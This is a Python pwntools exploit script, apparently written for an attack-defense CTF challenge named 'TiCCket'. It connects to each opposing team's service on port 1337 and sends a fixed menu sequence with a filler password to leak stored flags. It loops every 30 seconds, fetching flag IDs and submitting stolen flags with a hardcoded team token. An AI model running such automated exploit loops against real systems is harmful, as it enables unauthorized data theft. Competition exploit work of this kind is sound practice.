#/usr/bin/python3

import requests, time, re, string, random
import json
from pwn import *

TEAM_TOKEN = "ddfe3c79ffdb518891f4f82ea90b433f"			# TEAM_TOKEN INVIATO PER EMAIL
CHALLENGE_NAME = "TiCCket"		# NOME DELLA CHALLENGE INDICATO IN flagIds


def generate_random_string(length):
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str


def exploit(flagids):
	flag_list = []
	c = 1
	for ip in flagids[CHALLENGE_NAME]:
		size = len(flagids[CHALLENGE_NAME])
		print(f"{ip}\t-\t{c} / {size} ...")
		for hint in flagids[CHALLENGE_NAME][ip]:
			
			try:
				flag = get_flag(ip, json.loads(hint)["ctf_id"])
				print(flag)
			except Exception as e:
				print("ERR: {}".format(e))
				continue
			if flag not in flag_list:
				flag_list.append(flag)

		c += 1
	return flag_list
			
	
def get_flag(ip, hint):
	p=remote(ip,1337)
	p.recvuntil(b"> ",timeout=0.1)
	p.sendline(b"1")
	p.recvuntil(b":",timeout=0.1)
	p.sendline(hint.encode())
	p.recvuntil(b": ",timeout=0.1)
	p.sendline(b"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
	p.recvuntil(b"> ",timeout=0.1)
	p.sendline(b"3")
	p.recvuntil(b": ",timeout=0.1)
	p.sendline(b"0")
	p.recvuntil(b"> ",timeout=0.1)
	p.sendline(b"2")
	p.recvuntil(b": ",timeout=0.1)
	p.recvuntil(b": ",timeout=0.1)
	stringa=p.recvuntil(b"=",timeout=0.1)
	return stringa.decode()




	
	


## TEST get_flag
def test():
	hint = "r8cGEYTMuGnk"
	ip = "10.60.42.1"
	flag = get_flag(ip, hint)
	print(flag)


# EXPLOIT FINALE
def final_exploit():
	while True:
		print("Running exploit...")
		flagids = requests.get("http://10.10.0.1:8081/flagIds").json()
		flags = exploit(flagids)
		print(flags)

		print("Putting flags...")
		r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN}, json=flags).text
		print(r)
		print("Exploit ok...\nRepeat...")
		print("\n")

		time.sleep(30)


def main():
	#test()
	 final_exploit()


main()